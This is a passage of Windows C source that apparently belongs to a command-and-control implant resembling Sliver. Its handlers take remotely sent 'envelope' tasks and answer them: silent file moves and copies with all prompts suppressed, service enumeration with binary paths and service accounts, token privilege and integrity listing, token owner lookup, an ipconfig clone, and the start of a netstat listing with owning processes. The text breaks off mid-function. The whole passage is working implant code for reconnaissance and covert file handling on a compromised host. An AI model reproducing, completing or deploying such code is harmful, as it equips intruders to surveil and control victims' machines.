		FreeBuffer((PBUFFER)UnmarshaledData[4]);
		if (UnmarshaledData[1] != NULL) {
			for (i = 1; i <= dwArgc; i++) {
				FreeBuffer(((PBUFFER*)UnmarshaledData[1])[i]);
			}

			FREE(UnmarshaledData[1]);
		}

		FREE(UnmarshaledData);
	}

	FREE(pOutputBuffer);
	FREE(pErrorBuffer);
	FREE(lpCommandLine);
	FREE(lpStdOutPath);
	FREE(lpStdErrPath);
	FREE(StartupInfo.lpAttributeList);
	if (hParentProcess != NULL) {
		CloseHandle(hParentProcess);
	}

	if (hStdOut != INVALID_HANDLE_VALUE) {
		CloseHandle(hStdOut);
	}

	if (hStdErr != INVALID_HANDLE_VALUE) {
		CloseHandle(hStdErr);
	}

	FreeElement(pFinalElement);
	return pResult;
}

PENVELOPE MvHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[2];
	PBUFFER* pTemp = NULL;
	PENVELOPE pResult = NULL;
	DWORD i = 0;
	LPWSTR lpSrc = NULL;
	LPWSTR lpDest = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	DWORD dwErrorCode = ERROR_SUCCESS;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
		Element[i]->Type = Bytes;
	}

	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pTemp == NULL || pTemp[0] == NULL || pTemp[1] == NULL) {
		goto CLEANUP;
	}

	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_MOVE;
	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	dwErrorCode = SHFileOperationW(&ShFileStruct);
	if (dwErrorCode != ERROR_SUCCESS) {
		LOG_ERROR("SHFileOperationW", dwErrorCode);
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
CLEANUP:
	FREE(ShFileStruct.pFrom);
	FREE(ShFileStruct.pTo);
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FreeBuffer(pTemp[1]);
		FREE(pTemp);
	}

	FREE(lpSrc);
	FREE(lpDest);
	for (i = 0; i < _countof(Element); i++) {
		FREE(Element[i]);
	}

	return pResult;
}

PENVELOPE CpHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[2];
	PPBElement RespElementList[3];
	PPBElement RespElement = NULL;
	PBUFFER* pTemp = NULL;
	PENVELOPE pResult = NULL;
	DWORD i = 0;
	LPWSTR lpSrc = NULL;
	LPWSTR lpDest = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	DWORD dwErrorCode = ERROR_SUCCESS;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Bytes;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_COPY;
	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	dwErrorCode = SHFileOperationW(&ShFileStruct);
	if (dwErrorCode != ERROR_SUCCESS) {
		LOG_ERROR("SHFileOperationW", dwErrorCode);
		goto CLEANUP;
	}

	RespElementList[0] = CreateBytesElement(pTemp[0]->pBuffer, lstrlenA(pTemp[0]->pBuffer), 1);
	RespElementList[1] = CreateBytesElement(pTemp[1]->pBuffer, lstrlenA(pTemp[1]->pBuffer), 2);
	RespElementList[2] = CreateVarIntElement(GetFileSizeByPath(lpSrc), 3);
	RespElement = CreateStructElement(RespElementList, _countof(RespElementList), 0);

	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(RespElement->pMarshaledData, RespElement->cbMarshaledData);
	RespElement->pMarshaledData = NULL;
CLEANUP:
	FREE(ShFileStruct.pFrom);
	FREE(ShFileStruct.pTo);
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FreeBuffer(pTemp[1]);
		FREE(pTemp);
	}

	FREE(lpSrc);
	FREE(lpDest);
	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	FreeElement(RespElement);

	return pResult;
}

PENVELOPE ServicesHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	LPENUM_SERVICE_STATUS_PROCESSA Services = NULL;
	LPENUM_SERVICE_STATUS_PROCESSA pService = NULL;
	PPBElement ServiceDetails[7];
	PPBElement pFinalElement = NULL;
	PPBElement* ServiceList = NULL;
	DWORD dwNumberOfServices = 0;
	SC_HANDLE hService = NULL;
	DWORD i = 0;
	DWORD j = 0;
	SC_HANDLE hScManager = NULL;
	LPQUERY_SERVICE_CONFIGA pServiceConfig = NULL;
	DWORD dwBytesNeeded = 0;
	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;

	SecureZeroMemory(ServiceDetails, sizeof(ServiceDetails));
	Services = EnumServices(&dwNumberOfServices);
	if (Services == NULL || dwNumberOfServices == 0) {
		goto CLEANUP;
	}

	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
	if (hScManager == NULL) {
		LOG_ERROR("OpenSCManagerA", GetLastError());
		goto CLEANUP;
	}

	ServiceList = ALLOC(sizeof(PPBElement) * dwNumberOfServices);
	for (i = 0; i < dwNumberOfServices; i++) {
		pService = &Services[i];
		SecureZeroMemory(ServiceDetails, sizeof(ServiceDetails));
		ServiceDetails[0] = CreateBytesElement(pService->lpServiceName, lstrlenA(pService->lpServiceName), 1);
		for (j = 0; j < lstrlenA(pService->lpDisplayName); j++) {
			if ((UCHAR)pService->lpDisplayName[j] >= 0x7f) {
				pService->lpDisplayName[j] = '*';
			}
		}

		ServiceDetails[1] = CreateBytesElement(pService->lpDisplayName, lstrlenA(pService->lpDisplayName), 2);
		ServiceDetails[3] = CreateVarIntElement(pService->ServiceStatusProcess.dwCurrentState, 4);
		hService = OpenServiceA(hScManager, pService->lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
		if (hService != NULL) {
			QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, NULL, 0, &dwBytesNeeded);
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
				lpServiceDesc = ALLOC(dwBytesNeeded + 1);
				if (QueryServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, lpServiceDesc, dwBytesNeeded, &dwBytesNeeded)) {
					//ServiceDetails[2] = CreateBytesElement(lpServiceDesc->lpDescription, lstrlenA(lpServiceDesc->lpDescription), 3);
				}

				FREE(lpServiceDesc);
			}

			QueryServiceConfigA(hService, NULL, 0, &dwBytesNeeded);
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
				pServiceConfig = ALLOC(dwBytesNeeded + 1);
				if (QueryServiceConfigA(hService, pServiceConfig, dwBytesNeeded, &dwBytesNeeded)) {
					ServiceDetails[4] = CreateVarIntElement(pServiceConfig->dwStartType, 5);
					ServiceDetails[5] = CreateBytesElement(pServiceConfig->lpBinaryPathName, lstrlenA(pServiceConfig->lpBinaryPathName), 6);
					ServiceDetails[6] = CreateBytesElement(pServiceConfig->lpServiceStartName, lstrlenA(pServiceConfig->lpServiceStartName), 7);
				}

				FREE(pServiceConfig);
			}

			CloseServiceHandle(hService);
		}

		ServiceList[i] = CreateStructElement(ServiceDetails, _countof(ServiceDetails), 0);
	}

	pFinalElement = CreateRepeatedStructElement(ServiceList, dwNumberOfServices, 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;

CLEANUP:
	if (hScManager != NULL) {
		CloseServiceHandle(hScManager);
	}

	FREE(Services);
	FREE(ServiceList);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE GetPrivsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	DWORD i = 0;
	DWORD j = 0;
	PPBElement PrivInfo[6];
	PPBElement RespElement[3];
	PPBElement* PrivelegeList = NULL;
	PPBElement pFinalElement = NULL;
	HANDLE hToken = NULL;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	CHAR szProcessPath[MAX_PATH];
	LPSTR lpProcessName = NULL;
	LPSTR lpProcessIntegrity = NULL;
	CHAR szPrivName[0x40];
	CHAR szDisplayName[0x100];
	DWORD dwTemp = 0;
	DWORD dwLanguageId = 0;
	DWORD dwReturnedValue = 0;
	DWORD dwLastError = 0;
	PLUID_AND_ATTRIBUTES pPrivilege;

	SecureZeroMemory(szProcessPath, sizeof(szProcessPath));
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		LOG_ERROR("OpenProcessToken", GetLastError());
		goto CLEANUP;
	}

	pTokenPrivileges = GetTokenPrivileges(hToken);
	if (pTokenPrivileges == NULL) {
		goto CLEANUP;
	}

	SetLastError(ERROR_SUCCESS);
	dwReturnedValue = GetModuleFileNameA(NULL, szProcessPath, _countof(szProcessPath));
	dwLastError = GetLastError();
	if (dwReturnedValue == 0 || dwLastError == ERROR_INSUFFICIENT_BUFFER) {
		LOG_ERROR("GetModuleFileNameA", dwLastError);
		goto CLEANUP;
	}

	lpProcessName = PathFindFileNameA(szProcessPath);
	RespElement[2] = CreateBytesElement(lpProcessName, lstrlenA(lpProcessName), 3);
	lpProcessIntegrity = GetTokenIntegrityLevel(hToken);
	RespElement[1] = CreateBytesElement(lpProcessIntegrity, lstrlenA(lpProcessIntegrity), 2);
	PrivelegeList = ALLOC(sizeof(PPBElement) * pTokenPrivileges->PrivilegeCount);
	for (i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
		SecureZeroMemory(szPrivName, sizeof(szPrivName));
		SecureZeroMemory(szDisplayName, sizeof(szDisplayName));
		SecureZeroMemory(PrivInfo, sizeof(PrivInfo));

		pPrivilege = &pTokenPrivileges->Privileges[i];
		dwTemp = _countof(szPrivName);
		LookupPrivilegeNameA(NULL, &pPrivilege->Luid, szPrivName, &dwTemp);
		PrivInfo[0] = CreateBytesElement(szPrivName, lstrlenA(szPrivName), 1);
		dwTemp = _countof(szDisplayName);
		LookupPrivilegeDisplayNameA(NULL, szPrivName, szDisplayName, &dwTemp, &dwLanguageId);
		PrivInfo[1] = CreateBytesElement(szDisplayName, lstrlenA(szDisplayName), 2);
		PrivInfo[2] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_ENABLED) != 0, 3);
		PrivInfo[3] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) != 0, 4);
		PrivInfo[4] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_REMOVED) != 0, 5);
		PrivInfo[5] = CreateVarIntElement((pPrivilege->Attributes & SE_PRIVILEGE_USED_FOR_ACCESS) != 0, 6);

		PrivelegeList[i] = CreateStructElement(PrivInfo, _countof(PrivInfo), 0);
	}

	RespElement[0] = CreateRepeatedStructElement(PrivelegeList, pTokenPrivileges->PrivilegeCount, 1);
	pFinalElement = CreateStructElement(RespElement, _countof(RespElement), 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (hToken != NULL) {
		CloseHandle(hToken);
	}

	FREE(PrivelegeList);
	FREE(lpProcessIntegrity);
	FREE(pTokenPrivileges);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE CurrentTokenOwnerHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	DWORD i = 0;
	PPBElement pFinalElement = NULL;
	HANDLE hToken = NULL;
	PTOKEN_USER pTokenUser = NULL;
	LPSTR lpTokenOwner = NULL;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		LOG_ERROR("OpenProcessToken", GetLastError());
		goto CLEANUP;
	}

	pTokenUser = GetTokenUser(hToken);
	if (pTokenUser == NULL) {
		goto CLEANUP;
	}

	lpTokenOwner = LookupNameOfSid(pTokenUser->User.Sid, TRUE);
	if (lpTokenOwner == NULL) {
		LOG_ERROR("LookupNameOfSid", GetLastError());
		goto CLEANUP;
	}

	pFinalElement = CreateBytesElement(lpTokenOwner, lstrlenA(lpTokenOwner), 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (hToken != NULL) {
		CloseHandle(hToken);
	}

	FREE(pTokenUser);
	FREE(lpTokenOwner);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE IfconfigHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PIP_ADAPTER_ADDRESSES pAdapterInfo = NULL;
	PIP_ADAPTER_ADDRESSES pTemp = NULL;
	DWORD cbAdapterInfo = sizeof(IP_ADAPTER_ADDRESSES);
	DWORD dwErrorCode = ERROR_SUCCESS;
	DWORD i = 0;
	CHAR szTempBuffer[0x200];
	LPSTR lpUnicastAddr = NULL;
	LPSTR lpGateWayAddr = NULL;
	LPSTR lpDhcpServer = NULL;
	LPSTR lpDnsServerAddr = NULL;
	PIP_ADAPTER_UNICAST_ADDRESS_LH pAdapterUnicastAddr = NULL;
	PIP_ADAPTER_GATEWAY_ADDRESS_LH pGateWayAddr = NULL;
	PIP_ADAPTER_DNS_SERVER_ADDRESS_XP pDnsServerAddr = NULL;
	ULONG uMask = 0;
	LPSTR lpHostName = NULL;
	LPSTR lpPrimaryDnsSuffix = NULL;
	PENVELOPE pResult = NULL;
	PFIXED_INFO pFixedInfo = NULL;
	DWORD cbFixedInfo = sizeof(FIXED_INFO);
	DWORD dwLastError = 0;
	LPSTR lpNodeType = NULL;
	LPSTR lpRespData = NULL;
	LPSTR lpTempStr = NULL;
	PPBElement pElement = NULL;

	lpHostName = GetHostName();
	if (lpHostName == NULL) {
		goto CLEANUP;
	}

	lpPrimaryDnsSuffix = GetPrimaryDnsSuffix();
	pFixedInfo = ALLOC(cbFixedInfo);
	while (TRUE) {
		dwLastError = GetNetworkParams(pFixedInfo, &cbFixedInfo);
		if (dwLastError == ERROR_SUCCESS) {
			break;
		}
		else if (dwLastError == ERROR_BUFFER_OVERFLOW) {
			pFixedInfo = REALLOC(pFixedInfo, cbFixedInfo);
		}
		else {
			FREE(pFixedInfo);
			pFixedInfo = NULL;
			break;
		}
	}

	if (pFixedInfo != NULL) {
		if (pFixedInfo->NodeType == BROADCAST_NODETYPE) {
			lpNodeType = DuplicateStrA("Broadcast", 0);
		}
		else if (pFixedInfo->NodeType == PEER_TO_PEER_NODETYPE) {
			lpNodeType = DuplicateStrA("Peer to peer", 0);
		}
		else if (pFixedInfo->NodeType == MIXED_NODETYPE) {
			lpNodeType = DuplicateStrA("Mixed", 0);
		}
		else if (pFixedInfo->NodeType == HYBRID_NODETYPE) {
			lpNodeType = DuplicateStrA("Hybrid", 0);
		}
	}

	pAdapterInfo = ALLOC(cbAdapterInfo);
	pTemp = pAdapterInfo;
	dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
	if (dwErrorCode == ERROR_BUFFER_OVERFLOW) {
		pAdapterInfo = REALLOC(pAdapterInfo, cbAdapterInfo);
		pTemp = pAdapterInfo;
		dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
		if (dwErrorCode != ERROR_SUCCESS) {
			LOG_ERROR("GetAdaptersAddresses", GetLastError());
			goto CLEANUP;
		}
	}

	lpRespData = ALLOC(0x2000);
	lpRespData = StrCatExA(lpRespData, "\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : ");
	lpRespData = StrCatExA(lpRespData, lpHostName);
	lpRespData = StrCatExA(lpRespData, "\n   Primary Dns Suffix  . . . . . . . : ");
	if (lpPrimaryDnsSuffix != NULL) {
		lpRespData = StrCatExA(lpRespData, lpPrimaryDnsSuffix);
	}

	lpRespData = StrCatExA(lpRespData, "\n   Node Type . . . . . . . . . . . . : ");
	if (lpNodeType != NULL) {
		lpRespData = StrCatExA(lpRespData, lpNodeType);
	}

	lpRespData = StrCatExA(lpRespData, "\n   IP Routing Enabled. . . . . . . . : ");
	if (pFixedInfo != NULL) {
		if (pFixedInfo->EnableRouting) {
			lpRespData = StrCatExA(lpRespData, "yes");
		}
		else {
			lpRespData = StrCatExA(lpRespData, "no");
		}
	}

	lpRespData = StrCatExA(lpRespData, "\n   WINS Proxy Enabled. . . . . . . . : ");
	if (pFixedInfo != NULL) {
		if (pFixedInfo->EnableProxy) {
			lpRespData = StrCatExA(lpRespData, "yes");
		}
		else {
			lpRespData = StrCatExA(lpRespData, "no");
		}
	}

	while (TRUE) {
		if (pAdapterInfo == NULL) {
			break;
		}

		if (pAdapterInfo->IfType == IF_TYPE_SOFTWARE_LOOPBACK) {
			pAdapterInfo = pAdapterInfo->Next;
			continue;
		}

		lpRespData = StrCatExA(lpRespData, "\n\n");
		lpTempStr = ConvertWcharToChar(pAdapterInfo->FriendlyName);
		lpRespData = StrCatExA(lpRespData, lpTempStr);
		FREE(lpTempStr);
		lpRespData = StrCatExA(lpRespData, ":\n\n   Connection-specific DNS Suffix  . : ");
		if (pAdapterInfo->DnsSuffix != NULL && lstrlenW(pAdapterInfo->DnsSuffix) > 0) {
			lpTempStr = ConvertWcharToChar(pAdapterInfo->DnsSuffix);
			lpRespData = StrCatExA(lpRespData, lpTempStr);
			FREE(lpTempStr);
		}

		lpRespData = StrCatExA(lpRespData, "\n   Description . . . . . . . . . . . : ");
		lpTempStr = ConvertWcharToChar(pAdapterInfo->Description);
		lpRespData = StrCatExA(lpRespData, lpTempStr);
		FREE(lpTempStr);
		lpRespData = StrCatExA(lpRespData, "\n   Physical Address. . . . . . . . . : ");
		SecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
		for (i = 0; i < pAdapterInfo->PhysicalAddressLength; i++) {
			wsprintfA(&szTempBuffer[i * 3], "%02X-", pAdapterInfo->PhysicalAddress[i]);
		}

		szTempBuffer[lstrlenA(szTempBuffer) - 1] = '\0';
		lpRespData = StrCatExA(lpRespData, szTempBuffer);
		lpRespData = StrCatExA(lpRespData, "\n   DHCP Enabled. . . . . . . . . . . : ");
		if (pAdapterInfo->Flags & IP_ADAPTER_DHCP_ENABLED) {
			lpRespData = StrCatExA(lpRespData, "yes");
		}
		else {
			lpRespData = StrCatExA(lpRespData, "no");
		}

		lpRespData = StrCatExA(lpRespData, "\n   Autoconfiguration Enabled . . . . : yes");
		if (pAdapterInfo->OperStatus == IfOperStatusDown) {
			pAdapterInfo = pAdapterInfo->Next;
			continue;
		}

		lpRespData = StrCatExA(lpRespData, "\n   IP Address. . . . . . . . . . . . : ");
		pAdapterUnicastAddr = pAdapterInfo->FirstUnicastAddress;
		while (TRUE) {
			if (pAdapterUnicastAddr == NULL || pAdapterUnicastAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pAdapterUnicastAddr->DadState < NldsDeprecated) {
				pAdapterUnicastAddr = pAdapterUnicastAddr->Next;
				continue;
			}

			if (pAdapterUnicastAddr != pAdapterInfo->FirstUnicastAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpUnicastAddr = SocketAddressToStr(pAdapterUnicastAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpUnicastAddr);
			FREE(lpUnicastAddr);

			if (pAdapterUnicastAddr->Address.lpSockaddr->sa_family == AF_INET) {
				if (ConvertLengthToIpv4Mask(pAdapterUnicastAddr->OnLinkPrefixLength, &uMask) == STATUS_SUCCESS) {
					SecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
					wsprintfA(szTempBuffer, "/%d", uMask);
					lpRespData = StrCatExA(lpRespData, szTempBuffer);
				}
			}

			pAdapterUnicastAddr = pAdapterUnicastAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   Default Gateway . . . . . . . . . : ");
		pGateWayAddr = pAdapterInfo->FirstGatewayAddress;
		while (TRUE) {
			if (pGateWayAddr == NULL || pGateWayAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pGateWayAddr != pAdapterInfo->FirstGatewayAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpGateWayAddr = SocketAddressToStr(pGateWayAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpGateWayAddr);
			FREE(lpGateWayAddr);
			pGateWayAddr = pGateWayAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   DHCP Server . . . . . . . . . . . : ");
		if (pAdapterInfo->Dhcpv4Server.lpSockaddr != NULL) {
			lpDhcpServer = SocketAddressToStr(pAdapterInfo->Dhcpv4Server.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDhcpServer);
		}
		else if (pAdapterInfo->Dhcpv6Server.lpSockaddr != NULL) {
			lpDhcpServer = SocketAddressToStr(pAdapterInfo->Dhcpv6Server.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDhcpServer);
		}

		lpRespData = StrCatExA(lpRespData, "\n   DNS Servers . . . . . . . . . . . : ");
		pDnsServerAddr = pAdapterInfo->FirstDnsServerAddress;
		while (TRUE) {
			if (pDnsServerAddr == NULL || pDnsServerAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pDnsServerAddr != pAdapterInfo->FirstDnsServerAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpDnsServerAddr = SocketAddressToStr(pDnsServerAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDnsServerAddr);
			FREE(lpDnsServerAddr);
			pDnsServerAddr = pDnsServerAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   NetBIOS over Tcpip. . . . . . . . : ");
		if (pAdapterInfo->Flags & IP_ADAPTER_NETBIOS_OVER_TCPIP_ENABLED) {
			lpRespData = StrCatExA(lpRespData, "yes");
		}
		else {
			lpRespData = StrCatExA(lpRespData, "no");
		}

		pAdapterInfo = pAdapterInfo->Next;
	}

	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pElement->pMarshaledData, pElement->cbMarshaledData);
	pElement->pMarshaledData = NULL;
CLEANUP:
	FreeElement(pElement);
	FREE(pTemp);
	FREE(lpHostName);
	FREE(lpPrimaryDnsSuffix);
	FREE(pFixedInfo);
	FREE(lpNodeType);
	FREE(lpDhcpServer);
	FREE(lpRespData);

	return pResult;
}

PENVELOPE NetstatHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement RecvElementList[5];
	PPBElement SockTabEntry[6];
	PPBElement ProcessElement[2];
	PPBElement SockAddress[2];
	PPBElement pFinalElement = NULL;
	PPBElement* SockTabList = NULL;
	DWORD i = 0;
	DWORD dwNumberOfBytesRead = 0;
	PUINT64 pTemp = NULL;
	PENVELOPE pResult = NULL;
	DWORD dwReturnedLength = 0;
	BOOL Tcp = FALSE;
	BOOL Udp = FALSE;
	BOOL Ipv4 = FALSE;
	BOOL Ipv6 = FALSE;
	BOOL Listening = FALSE;
	PNETWORK_CONNECTION pNetState = NULL;
	PNETWORK_CONNECTION pConnection = NULL;
	DWORD dwNumberOfConnections = 0;
	DWORD dwAddressType = 0;
	LPSTR lpStateStr = NULL;
	HANDLE hProc = NULL;
	LPSTR lpProcessPath = NULL;
	LPSTR lpProcessImageName = NULL;
	LPWSTR lpIpAddress = NULL;
	DWORD cchIpAddress = 0;
	LPSTR lpTemp = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Varint;
	}

	pTemp = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	Tcp = (BOOL)pTemp[0];
	Udp = (BOOL)pTemp[1];
	Ipv4 = (BOOL)pTemp[2];
	Ipv6 = (BOOL)pTemp[3];
	Listening = (BOOL)pTemp[4];

	pNetState = GetNetworkConnections(&dwNumberOfConnections);
	SockTabList = ALLOC(sizeof(PPBElement) * dwNumberOfConnections);
	for (i = 0; i < dwNumberOfConnections; i++) {
		pConnection = &pNetState[i];
		SecureZeroMemory(&SockTabEntry, sizeof(SockTabEntry));
		SecureZeroMemory(&ProcessElement, sizeof(ProcessElement));
		SecureZeroMemory(&SockAddress, sizeof(SockAddress));
		if (!Tcp && (pConnection->uProtocolType & TCP_PROTOCOL_TYPE)) {
			continue;
		}

		if (!Udp && (pConnection->uProtocolType & UDP_PROTOCOL_TYPE)) {
			continue;
		}

		dwAddressType = pConnection->LocalEndpoint.Address.Type;
		if (!Ipv4 && (dwAddressType == IPV4_NETWORK_TYPE)) {
			continue;
		}

		if (!Ipv6 && (dwAddressType == IPV6_NETWORK_TYPE)) {
			continue;
		}

		if ((pConnection->uProtocolType & TCP_PROTOCOL_TYPE) && Listening && pConnection->State != MIB_TCP_STATE_LISTEN) {
			continue;
		}

		if (pConnection->uProtocolType & TCP_PROTOCOL_TYPE) {
			if (pConnection->State == MIB_TCP_STATE_CLOSED) {
				lpStateStr = DuplicateStrA("Closed", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_LISTEN) {
				lpStateStr = DuplicateStrA("Listen", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_SYN_SENT) {
				lpStateStr = DuplicateStrA("SYN sent", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_SYN_RCVD) {
				lpStateStr = DuplicateStrA("SYN received", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_ESTAB) {
				lpStateStr = DuplicateStrA("Established", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_FIN_WAIT1) {
				lpStateStr = DuplicateStrA("FIN wait 1", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_FIN_WAIT2) {
				lpStateStr = DuplicateStrA("FIN wait 2", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_CLOSE_WAIT) {
				lpStateStr = DuplicateStrA("Close wait", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_CLOSING) {
				lpStateStr = DuplicateStrA("Closing", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_LAST_ACK) {
				lpStateStr = DuplicateStrA("Last ACK", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_TIME_WAIT) {
				lpStateStr = DuplicateStrA("Time wait", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_DELETE_TCB) {
				lpStateStr = DuplicateStrA("Delete TCB", 0);
			}
			else if (pConnection->State == MIB_TCP_STATE_RESERVED) {
				lpStateStr = DuplicateStrA("Bound", 0);
			}
			else {
				lpStateStr = DuplicateStrA("Unknown", 0);
			}

			SockTabEntry[2] = CreateBytesElement(lpStateStr, lstrlenA(lpStateStr), 3);
			FREE(lpStateStr);
		}

		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pConnection->ProcessId);
		if (hProc != NULL) {
			lpProcessPath = GetProcessImageFileNameWin32(hProc);
			lpProcessImageName = PathFindFileNameA(lpProcessPath);
			ProcessElement[0] = CreateVarIntElement((UINT64)pConnection->ProcessId, 4);
			ProcessElement[1] = CreateBytesElement(lpProcessImageName, lstrlenA(lpProcessImageName), 13);
			CloseHandle(hProc);
			FREE(lpProcessPath);
			SockTabEntry[4] = CreateStructElement(ProcessElement, _countof(ProcessElement), 5);
		}

		if (pConnection->uProtocolType & TCP_PROTOCOL_TYPE) {
			SockTabEntry[5] = CreateBytesElement("tcp", 3, 6);
		}
		else {
			SockTabEntry[5] = CreateBytesElement("udp", 3, 6);
		}

		if (dwAddressType == IPV4_NETWORK_TYPE) {
			cchIpAddress = INET_ADDRSTRLEN + 1;
			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
			RtlIpv4AddressToStringExW(&pConnection->LocalEndpoint.Address.InAddr, 0, lpIpAddress, &cchIpAddress);
